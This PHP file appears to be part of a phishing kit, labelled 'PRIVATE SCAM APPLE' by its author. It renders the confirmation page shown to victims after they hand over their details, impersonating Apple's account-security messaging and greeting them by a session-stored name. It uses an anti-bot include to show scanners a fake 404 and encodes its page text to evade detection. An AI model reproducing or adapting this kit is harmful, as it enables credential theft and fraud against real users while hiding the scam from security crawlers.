<?php 
/*   
                              #===============================#
                              #    PRIVATE SCAM APPLE         #
                              #           PIradz17            #
							  #     Facebook.com/Piradz17     #
                              #===============================#                     
*/
session_start();
error_reporting(0);
include('./INC-FUN/Encrypte.php');
include "./ANTIBOTS.php";
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
?>
<div class="body success-body"><div class="content-body"><div class="success"><h2 id="zaz"><?php echo xTextEncode('Congratulations!');?></h2><div><h3 style="font-weight:200"><?php echo xTextEncode('Dear');?> <?=$_SESSION['_fname_'];?>,</h3><p><?php echo xTextEncode('Thank you for taking the steps to restore your account access');?>.</p><p><?php echo xTextEncode('Your patience and efforts increase security for our entire community of users.');?></p><p><?php echo xTextEncode('Apple takes the safety of your account, business, and financial data as seriously as you do, and these ongoing checks of our system contribute to our high level of security');?></p><p><?php echo xTextEncode('Your Apple ID will be verified in the next 24 hours.');?></p><div style="text-align:center"><a href="<?php echo xTextEncode('https://appleid.apple.com/account/manage');?>"><button class="signin" id="sign-in"><?php echo xTextEncode('My Apple ID');?></button></a></div></div></div></div></div>